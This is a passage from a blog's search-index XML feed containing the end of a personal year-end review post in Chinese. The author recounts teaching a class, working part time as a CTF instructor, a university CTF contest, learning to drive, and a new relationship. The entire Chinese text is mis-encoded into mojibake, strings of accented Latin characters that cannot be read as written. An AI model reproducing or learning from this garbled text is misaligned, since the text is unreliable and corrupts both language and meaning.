ä¸ºï¼Œâ€¦â€¦ã€‚</p><p>å››æœˆä»½å’Œäº”æœˆä»½å§ï¼Œæ„Ÿè°¢ä¿ºä»¬éƒ­è€å¸ˆè®©æˆ‘å¸®ä»–å¸¦äº†åå‡ å¤©è¯¾ï¼Œæ„Ÿè°¢éƒ­è€å¸ˆåˆç»™æˆ‘äº†ä¸€æ¬¡è¿™ä¹ˆå¥½çš„é”»ç‚¼æœºä¼šã€‚æ„Ÿè§‰å½“è€å¸ˆå¥½è¾›è‹¦å•Šï¼Œemmmmï¼Œå…¶å®å½“å¯¼å¸ˆä¸æ˜¯å¾ˆè¾›è‹¦ï¼Œå°±æ˜¯æœ‰äº›ä¸œè¥¿æ˜æ˜åœ¨è¯¾ä¸Šæˆ‘å·²ç»è®²è¿‡äº†ï¼Œç„¶åå‘¢ï¼Œæœ‰åŒå­¦è¯¾ä¸‹åˆæ¥é—®ï¼Œè€Œä¸”è¿˜ä¸æ˜¯ä¸€ä¸ªåŒå­¦é—®ï¼Œå¥½å¤šåŒå­¦éƒ½æ¥é—®ã€‚è¿™é‡Œå¯èƒ½ä¸æ˜¯æˆ‘æ²¡æœ‰è®²è¿‡ï¼Œæ˜¯æˆ‘å¸ƒç½®äº†ä½œä¸šï¼Œéƒ½æ²¡æœ‰å¬ï¼Œæ¥é—®çš„å¾ˆç´¯ã€‚å¸ƒç½®ä½œä¸šä¹Ÿå¾ˆç´¯ã€‚emmmmï¼Œè¿˜æœ‰ä¸€ä¸ªï¼ŒåŒå­¦æŠ„ä½œä¸šä¹ŸæŒºä¸¥é‡çš„ï¼Œé‚£ä½œä¸šæˆªå›¾linuxç”¨æˆ·åéƒ½ä¸€æ ·ï¼Œæˆ‘è£‚å¼€ã€‚çœ‹åˆ°ä½œä¸šï¼Œæˆ‘ç¬é—´æ„Ÿè§‰æˆ‘è¿™ä¸ªè€å¸ˆå½“çš„å¾ˆå¤±è´¥ï¼Œæ²¡æœ‰æ•™ä¼šå¤§å®¶ã€‚æœ€åä¸€ç‚¹ï¼Œè¦æ˜¯å½“è€å¸ˆä¸ç”¨å¸ƒç½®ä½œä¸šï¼Œä¸ç”¨æ”¹ä½œä¸šï¼ŒåŒå­¦ä»¬ä¸è¦ä¸€ç›´é—®åŒä¸€ä¸ªæˆ‘ä¸Šè¯¾è®²è¿‡çš„é—®é¢˜çš„è¯ï¼Œæˆ‘æ„Ÿè§‰å½“è€å¸ˆè¿˜æ˜¯è›®èˆ’æœçš„ã€‚è®²è¯¾åšè§†é¢‘è¿˜æ˜¯è›®ä¸é”™çš„ï¼Œæ²¡æœ‰å”®åã€‚</p><p>ä¸ƒæœˆä»½ï¼Œæ„Ÿè°¢Aä½¬ç»™æˆ‘æ¨äº†ä¸ªè®²ctfè¯¾çš„å…¼èŒã€‚ä»ä¸­ä¹Ÿå­¦åˆ°äº†è®¸å¤šè®²è¯¾çš„æŠ€å·§ï¼Œä¹Ÿå­¦åˆ°äº†å¾ˆå¤šçŸ¥è¯†ã€‚æˆ‘è§‰å¾—ç°åœ¨è®©æˆ‘æ‰“2019å¹´é‚£ä¸ªawdæ¯”èµ›ï¼Œæˆ‘ä¸€å®šæ‰“ç©¿ä»–ä»¬ã€‚æ„Ÿè°¢Aä½¬ã€‚</p><p>å…«æœˆä»½è¿˜å›å®¶å­¦äº†ä¸ªè½¦ï¼Œemmmï¼Œéš¾åº¦ä¸­ç­‰å§ï¼Œå¸Œæœ›æ—©ç‚¹æ‹¿åˆ°è¯ï¼Œå°±èƒ½å¼€è½¦äº†ã€‚</p><p>ä¹æœˆï¼Œæ„Ÿè°¢å‡¡å“¥ä¿¡ä»»æˆ‘ï¼Œç»™æˆ‘é”»ç‚¼è‡ªå·±çš„æœºä¼šï¼Œè®©æˆ‘å‚åŠ äº†ä¸ªè®²åº§ã€‚</p><p>åä¸€æœˆä»½çš„å¤©æ´¥å¤§å­¦ç”Ÿctfæ¯”èµ›ï¼Œemmmmï¼Œæ€ä¹ˆè¯´å‘¢ï¼Œåˆèµ›æ‰“çš„è¿˜è¡Œï¼Œå†³èµ›å˜›ï¼Œæ„Ÿè§‰è¿˜æ˜¯è‡ªå·±å¤ªèœäº†ä¸€ç‚¹ï¼Œæ²¡æœ‰å›¢é˜Ÿã€‚ä¸€ä¸ªäººçš„èƒ½åŠ›ç¡®å®æ˜¯æœ‰é™çš„ï¼Œå½“ç„¶ä¸èƒ½æ’é™¤é‚£äº›å…¨æ ˆçš„å¤§ä½¬ï¼Œæ˜¯çœŸçš„å¼ºã€‚æ¯”èµ›ä¹Ÿå°±å¾—äº†äºŒç­‰å¥–ï¼Œå°‘ç‚¹pyï¼Œå°‘ç‚¹ä»£æ‰“ï¼Œæˆ–è®¸æœ‰æœºä¼šæ‹¿ä¸ªä¸€ç­‰å¥–ã€‚ä»¥å­¦ç”Ÿèº«å‚åŠ çš„æ¯”èµ›è¶Šæ¥è¶Šå°‘äº†ï¼Œçæƒœå§ã€‚ä¸è¿‡å®‰å…¨è¿™æ¡è·¯ï¼Œæˆ‘æ˜¯ä¸ä¼šæ”¾å¼ƒçš„ã€‚</p><blockquote><p>åäºŒæœˆä»½å°±æ¯”è¾ƒç‰¹æ®Šäº†ï¼Œè¿™æ˜¯æˆ‘è¿™ä¸€å¹´ä¸­å‘ç”Ÿçš„æœ€å¤§çš„äº‹æƒ…äº†ï¼Œå¾—åˆ°äº†ä¸€ä¸ªæˆ‘å–œæ¬¢çš„å¥³å­©ã€‚ä»æ­¤ä»¥åï¼Œæˆ‘ä¹Ÿå°†ä¸å†æ˜¯å­¤å•çš„ä¸€äººã€‚èº«ä»½ä¹Ÿå¤šäº†ä¸€ä¸ªï¼Œæ„Ÿè§‰è‚©ä¸Šçš„è´£ä»»æ›´é‡äº†äº›ã€‚</p><p>ç»ˆäºå’Œè¿‡å»è¯´äº†å†è§ï¼Œæ˜¯æ—¶å€™å¼€å§‹æ–°çš„ç”Ÿæ´»äº†ã€‚</p><p><img src="/images/my2022/1.jpg" alt="image-20220130142802861"></p></blockquote><p>å¸Œæœ›æ˜å¹´å¯ä»¥æ‰¾åˆ°ä¸€ä»½å®ä¹ å·¥ä½œï¼Œå¤šå¤šæ›´æ–°åšå®¢ã€‚</p><p>éœ€è¦æ„Ÿè°¢çš„äººå¤ªå¤šï¼Œå¯¹æˆ‘çš„å¥½æˆ‘éƒ½è®°å¾—ã€‚</p><p>â€œæˆ‘ä»ä¸ç›¸ä¿¡ä¸€å¸†é£é¡ºçš„è¯´æ³•ï¼Œä¸€å¸†é£é¡ºä»£è¡¨ç€ä½ æ²¡æœ‰é‡åˆ°ä»»ä½•å›°éš¾ï¼Œä¹Ÿå°±è¯´ä½ æ²¡æœ‰ç»å†è¿‡æ‰“å‡»ï¼Œä¹Ÿå°±æ²¡æœ‰ç§¯ç´¯ç›¸å¯¹åº”çš„ç»éªŒã€‚å­¦èµ°è·¯è¦ç»å†æ‘”è·¤ï¼Œå­¦éª‘è‡ªè¡Œè½¦è¦ç»å†æ‘”è·¤ï¼Œå­¦æ»‘é›ªè¦ç»å†æ‘”è·¤ï¼Œä½ éœ€è¦ä½“éªŒé‚£ç§æ‘”è·¤çš„ç—›æ„Ÿï¼Œä½ æ‰èƒ½å¤Ÿåœ¨æ‘”è·¤å‰åšå‡ºç›¸åº”çš„åŠ¨ä½œæ¥è®©è‡ªå·±å›å½’æ­£è½¨ã€‚â€</p><p>é€ç»™è‡ªå·±ï¼Œè°¦å‘ä¸€äº›ã€‚</p><blockquote><p>ç”Ÿæ—¥å¿«ä¹~<br>ä¸€ç›´åœ¨è·¯ä¸Š<br>åŠ æ²¹ï¼<br>è¯»ä¹¦å¤ªå°‘ï¼Œæƒ³çš„å¤ªå¤š<br>date: 2023-01-20 00:00:00</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
